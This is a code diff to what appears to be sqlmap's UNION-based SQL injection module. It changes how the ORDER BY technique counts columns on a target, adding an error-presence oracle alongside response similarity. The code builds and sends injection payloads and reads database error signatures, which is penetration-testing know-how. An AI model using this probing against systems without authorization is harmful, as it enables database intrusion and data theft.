@@ -61,14 +61,37 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
 
     @stackedmethod
     def _orderByTechnique(lowerCount=None, upperCount=None):
-        def _orderByTest(cols):
+        def _orderByProbe(cols):
             query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
             query = agent.suffixQuery(query, suffix=suffix, comment=comment)
             payload = agent.payload(newValue=query, place=place, parameter=parameter, where=where)
             page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
-            return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order (by|clause)", "unknown column", "failed")) and not kb.heavilyDynamic and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I) is not None
+            errored = any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order (by|clause)", "unknown column", "failed"))
+            return page, headers, code, errored
 
-        if _orderByTest(1 if lowerCount is None else lowerCount) and not _orderByTest(randomInt() if upperCount is None else upperCount + 1):
+        lowCount = 1 if lowerCount is None else lowerCount
+        highCount = randomInt() if upperCount is None else upperCount + 1
+
+        lowPage, lowHeaders, lowCode, lowErrored = _orderByProbe(lowCount)
+        highPage, highHeaders, highCode, highErrored = _orderByProbe(highCount)
+
+        # When an out-of-range ORDER BY position visibly errors on this target, the column count can be
+        # bisected on error presence alone - immune to result-set shifts caused by the injection context
+        # (e.g. a LIKE '%...%' search whose matches change once the string literal is closed), which would
+        # otherwise make the response-similarity oracle reject a still-valid position.
+        errorOracle = highErrored and not lowErrored
+
+        def _orderByValid(page, headers, code, errored):
+            if re.search(r"data types cannot be compared or sorted", page or "", re.I):
+                return True
+            if errored:
+                return False
+            return errorOracle or (not kb.heavilyDynamic and comparison(page, headers, code))
+
+        def _orderByTest(cols):
+            return _orderByValid(*_orderByProbe(cols))
+
+        if _orderByValid(lowPage, lowHeaders, lowCode, lowErrored) and not _orderByValid(highPage, highHeaders, highCode, highErrored):
             infoMsg = "'ORDER BY' technique appears to be usable. "
             infoMsg += "This should reduce the time needed "
             infoMsg += "to find the right number "
